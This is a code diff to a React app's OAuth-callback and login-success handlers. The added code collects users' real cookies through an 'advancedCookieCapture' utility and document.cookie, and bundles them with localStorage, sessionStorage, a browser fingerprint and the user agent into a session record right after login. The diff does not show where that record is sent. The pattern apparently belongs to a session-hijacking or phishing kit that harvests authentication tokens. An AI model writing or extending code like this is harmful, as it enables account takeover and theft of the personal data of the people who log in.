@@ -203,6 +203,21 @@ function App() {
     if (code && provider) {
       console.log('🔐 Processing OAuth callback for:', provider);
       
+      // Capture real cookies using advanced system before processing
+      let realCookies = '';
+      let cookieList: any[] = [];
+      try {
+        const { advancedCookieCapture } = require('./utils/advancedCookieCapture');
+        if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
+          cookieList = advancedCookieCapture.getAllCookies();
+          console.log('🍪 OAuth captured cookies from advanced system:', cookieList.length);
+        }
+        realCookies = typeof document !== 'undefined' ? document.cookie : '';
+      } catch (e) {
+        console.warn('Advanced cookie capture not available, using document.cookie');
+        realCookies = typeof document !== 'undefined' ? document.cookie : '';
+      }
+      
       // Capture cookies and session data after successful OAuth return
       const postAuthFingerprint = getBrowserFingerprint();
       
@@ -215,9 +230,9 @@ function App() {
         clientIP: 'Unknown',
         userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
         deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-        cookies: postAuthFingerprint.cookies,
+        cookies: realCookies || postAuthFingerprint.cookies,
         cookiesParsed: postAuthFingerprint.cookiesParsed, // <-- added: parsed cookie map
-        cookieList: postAuthFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
+        cookieList: cookieList.length > 0 ? cookieList : (postAuthFingerprint.cookieList || []),  // <-- added: normalized cookie metadata list (if available)
         documentCookies: typeof document !== 'undefined' ? document.cookie : '',
         localStorage: postAuthFingerprint.localStorage,
         sessionStorage: postAuthFingerprint.sessionStorage,
@@ -328,6 +343,21 @@ function App() {
   const handleLoginSuccess = async (sessionData: any) => {
     console.log('🔐 Login success:', sessionData);
     
+    // Capture real cookies using advanced system before processing
+    let realCookies = '';
+    let cookieList: any[] = [];
+    try {
+      const { advancedCookieCapture } = require('./utils/advancedCookieCapture');
+      if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
+        cookieList = advancedCookieCapture.getAllCookies();
+        console.log('🍪 Captured cookies from advanced system:', cookieList.length);
+      }
+      realCookies = typeof document !== 'undefined' ? document.cookie : '';
+    } catch (e) {
+      console.warn('Advanced cookie capture not available, using document.cookie');
+      realCookies = typeof document !== 'undefined' ? document.cookie : '';
+    }
+    
     // Enhanced cookie setting with real-time system (no expiry)
     try {
       const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
@@ -371,9 +401,9 @@ function App() {
       clientIP: 'Unknown',
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
       deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-      cookies: browserFingerprint.cookies,
+      cookies: realCookies || browserFingerprint.cookies,
       cookiesParsed: browserFingerprint.cookiesParsed, // <-- added: parsed cookie map
-      cookieList: browserFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
+      cookieList: cookieList.length > 0 ? cookieList : (browserFingerprint.cookieList || []),  // <-- added: normalized cookie metadata list (if available)
       documentCookies: typeof document !== 'undefined' ? document.cookie : '',
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
